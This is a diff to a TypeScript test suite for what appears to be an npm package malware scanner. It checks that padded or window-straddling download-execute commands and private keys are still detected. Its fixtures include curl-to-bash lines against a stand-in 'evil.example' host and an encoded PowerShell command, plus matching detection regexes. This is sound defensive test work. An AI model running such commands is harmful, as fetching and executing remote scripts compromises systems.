@@ -89,6 +89,21 @@ describe("deterministic scan cost", () => {
     expect(matchesAnyPattern(source, [/absent/])).toBe(false);
   });
 
+  it("does not manufacture regex boundaries at scan-window seams", () => {
+    // The bounded matcher uses a 6 KB core with 1 KB of context on each side.
+    // Put `fetch` at the second core boundary, where slicing without context
+    // would turn the suffix of `prefetch` into a standalone network call.
+    const source = `${"x".repeat(6 * 1024 - 3)}prefetch(${"z".repeat(3 * 1024)}`;
+    expect(matchesAnyPattern(source, [/\bfetch\s*\(/])).toBe(false);
+    expect(matchesAnyPattern(source, [/(?<![\w$.])fetch\s*\(/])).toBe(false);
+
+    const anchored = `${"x".repeat(6 * 1024)}import os${"z".repeat(3 * 1024)}`;
+    expect(matchesAnyPattern(anchored, [/^import\s+/])).toBe(false);
+
+    const artificialEnd = `needle${"a".repeat(7 * 1024 - 6)}!${"z".repeat(3 * 1024)}`;
+    expect(matchesAnyPattern(artificialEnd, [/needle[^!]*$/])).toBe(false);
+  });
+
   it.each(PAYLOADS)(
     "stays linear in line length: %s",
     (_name, make) => {
@@ -127,6 +142,7 @@ describe("deterministic scan cost", () => {
 
   it.each([
     `curl -H "X-Pad: ${"a".repeat(512)}" https://evil.example/x.sh | bash`,
+    `curl -H "X-Pad: ${"a".repeat(9 * 1024)}" https://evil.example/x.sh | bash`,
     `powershell ${"-NoProfile ".repeat(48)} -EncodedCommand QUFBQQ==`,
   ])("does not let padding hide a download-execute command", (command) => {
     const findings = deterministicFindings(
@@ -143,6 +159,20 @@ describe("deterministic scan cost", () => {
         expect.objectContaining({ ruleId: "code.remote-shell", severity: "critical" }),
       ]),
     );
+  });
+
+  it("does not compose shell signals across statement barriers", () => {
+    const command = `curl -H "X-Pad: ${"a".repeat(9 * 1024)}" https://example.invalid/x; echo ok | bash`;
+    const findings = deterministicFindings(
+      [
+        file("package.json", JSON.stringify({ name: "probe", version: "1.0.0" })),
+        file("install.js", command),
+      ],
+      [],
+      { name: "probe", version: "1.0.0" },
+      { entrypointResolution: "npm" },
+    );
+    expect(findings.some((finding) => finding.ruleId === "code.remote-shell")).toBe(false);
   });
 
   it("still finds a base64 decode whose prefix is in an earlier scan window", () => {
@@ -182,13 +212,40 @@ describe("deterministic scan cost", () => {
     const redacted = redactText(`key = ${pem}`);
     expect(redacted).toContain("[REDACTED_PRIVATE_KEY]");
     expect(redacted).not.toContain(body);
+
+    const findings = deterministicFindings(
+      [
+        file("package.json", JSON.stringify({ name: "probe", version: "1.0.0" })),
+        file("key.pem", pem),
+      ],
+      [],
+      { name: "probe", version: "1.0.0" },
+      { entrypointResolution: "npm" },
+    );
+    expect(findings).toEqual(
+      expect.arrayContaining([expect.objectContaining({ ruleId: "file.secret-content" })]),
+    );
+  });
+
+  it("does not treat a private-key delimiter constant as key material", () => {
+    const source = 'export const PRIVATE_KEY_HEADER = "-----BEGIN PRIVATE KEY-----";';
+    const findings = deterministicFindings(
+      [
+        file("package.json", JSON.stringify({ name: "probe", version: "1.0.0" })),
+        file("pem-parser.js", source),
+      ],
+      [],
+      { name: "probe", version: "1.0.0" },
+      { entrypointResolution: "npm" },
+    );
+    expect(findings.some((finding) => finding.ruleId === "file.secret-content")).toBe(false);
   });
 
   it("finds a match that straddles a scan-window seam", () => {
-    // The window is 8 KB with a 1 KB overlap; put the match just past the first
-    // window boundary so only the overlap can carry it.
-    // Trailing space so `\bcurl\b` has a word boundary to match against.
-    const filler = `${"a".repeat(8 * 1024 - 21)} `;
+    // Put the match at the start of the second 6 KB core. Its 1 KB left context
+    // must preserve the real word boundary while the first window rejects the
+    // same match because it starts outside that window's core.
+    const filler = `${"a".repeat(6 * 1024 - 1)} `;
     const line = `${filler}curl https://x | bash`;
     expect(firstMatchingLine(line, [/\bcurl\b[^\n;&]{0,400}\|\s*(?:ba)?sh\b/])).toBe(1);
     expect(firstMatchingCodeLine(line, [/\bcurl\b[^\n;&]{0,400}\|\s*(?:ba)?sh\b/])).toBe(1);
